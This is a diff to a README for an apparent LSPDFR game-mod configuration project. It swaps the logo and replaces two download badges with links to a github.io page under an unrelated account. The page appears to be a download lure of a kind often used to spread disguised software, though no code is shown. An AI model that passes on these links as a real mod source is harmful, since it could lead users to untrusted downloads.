@@ -1,14 +1,11 @@
 # LSPDFR Gameplay Configuration Environment for Patrol Enhancement
 
 <div align="center">
-  <img src="https://s3-attachments.int-cdn.lcpdfrusercontent.com/monthly_2017_07/5973c8d8802b2_LSPDFRLOGO.png.f6c33575c7fb036a4c30094cb3ddddb4.png" alt="LSPDFR Logo"/>
+  <img src="https://gamer-guides.com/wp-content/uploads/2025/09/Arrest-in-game-LSPD-FR-Using-Controls-Featured-Image.png" alt="LSPDFR Logo"/>
 </div>
 
-<div align="center">
+[![GET LSPDFR Gameplay](https://img.shields.io/badge/GET%20%E2%80%94%20LSPDFR-Gameplay-0078D6?style=for-the-badge&logoColor=white)](https://kimberlybakery593.github.io/.github/LSPDFR-Gameplay)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://lspdfr-gameplay-config.github.io/.github/)
-
-</div>
 
 ---
 
@@ -38,11 +35,8 @@ This ensures clean alignment with standard patrol car behaviors without impactin
   <img src="https://images.steamusercontent.com/ugc/509252911716913184/E13A2A1E8CEB54E2B7B11419B85462579066BD46/" alt="LSPDFR Config Preview"/>
 </div>
 
-<div align="center">
+[![GET LSPDFR Gameplay](https://img.shields.io/badge/GET%20%E2%80%94%20LSPDFR-Gameplay-0078D6?style=for-the-badge&logoColor=white)](https://kimberlybakery593.github.io/.github/LSPDFR-Gameplay)
 
-[![Get for Desktop](https://img.shields.io/badge/Get_for_Desktop-blue?style=for-the-badge)](https://lspdfr-gameplay-config.github.io/.github/)
-
-</div>
 
 ---
 
